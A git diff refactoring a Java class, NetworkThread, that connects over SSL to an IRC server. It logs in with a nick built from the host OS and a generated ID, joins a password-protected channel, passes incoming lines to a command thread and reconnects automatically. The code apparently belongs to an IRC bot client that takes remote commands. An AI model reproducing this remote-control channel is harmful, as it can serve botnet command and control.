@@ -1,21 +1,17 @@
-package syn.net;
+package syn.threads;
 
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
-import java.net.HttpURLConnection;
-import java.net.Socket;
-import java.net.URL;
-import java.net.UnknownHostException;
 
 import javax.net.ssl.SSLSocket;
 import javax.net.ssl.SSLSocketFactory;
 
 import syn.main.Client;
-import syn.main.Utilities;
 import syn.utils.Settings;
+import syn.utils.Utilities;
 
 public class NetworkThread implements Runnable {
 	
@@ -27,15 +23,19 @@ public class NetworkThread implements Runnable {
 	private Utilities uc;
 	private String line;
 	
-	public NetworkThread(String server, String channel, int port) throws Exception {
-		this.channel = channel;
-		SSLSocketFactory sslsocketfactory = (SSLSocketFactory) SSLSocketFactory.getDefault();
-		socket = (SSLSocket) sslsocketfactory.createSocket(server, port);
-		//socket = new Socket(server, port);
-		writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
-		reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
-		uc = new Utilities();
-		line = null;
+	public NetworkThread(String server, String channel, int port) {
+		try {
+			this.channel = channel;
+			SSLSocketFactory sslsocketfactory = (SSLSocketFactory) SSLSocketFactory.getDefault();
+			socket = (SSLSocket) sslsocketfactory.createSocket(server, port);
+			//socket = new Socket(server, port);
+			writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
+			reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+			uc = new Utilities();
+			line = null;
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
 	}
 	
 	public void run() {
@@ -45,7 +45,7 @@ public class NetworkThread implements Runnable {
 	}
 	
 	private void connect() throws IOException {	
-		String nick = "[" + uc.procOS(Client.os) + "||" + uc.genCode() + "]";
+		String nick = "[" + uc.procOS(Client.getInstance().os) + "||" + uc.genCode() + "]";
 		String login = "synth";
 
 		// Log on to the server.
@@ -55,7 +55,7 @@ public class NetworkThread implements Runnable {
 
 		// Read lines from the server until it tells us we have connected.
 		while((line = reader.readLine()) != null) {
-			Client.getCmdThread().setLine(line);
+			Client.getInstance().cmdThread.setLine(line);
 			if(line.contains("004")) {
 				// We are now logged in.
 				break;
@@ -68,19 +68,22 @@ public class NetworkThread implements Runnable {
 		// Join the channel.
 		writer.write("JOIN " + channel + " " + Settings.channelPass + "\r\n");
 		writer.flush();
-		Client.connected = true;
+		Client.getInstance().connected = true;
 
 		// Keep reading lines from the server.
 		while((line = reader.readLine()) != null) {
-			Client.getCmdThread().setLine(line);
+			Client.getInstance().cmdThread.setLine(line);
 			// Print the raw line received by the bot.
 			//TODO: DEBUG 
 		}
+		
+		//Disconnected
+		connect();
 	}
 	
 	public void disconnect() {
 		try {
-			Client.dupePrevent.close();
+			Client.getInstance().dupePrevent.close();
 			socket.close();
 			System.exit(0);
 		} catch (IOException e) {}
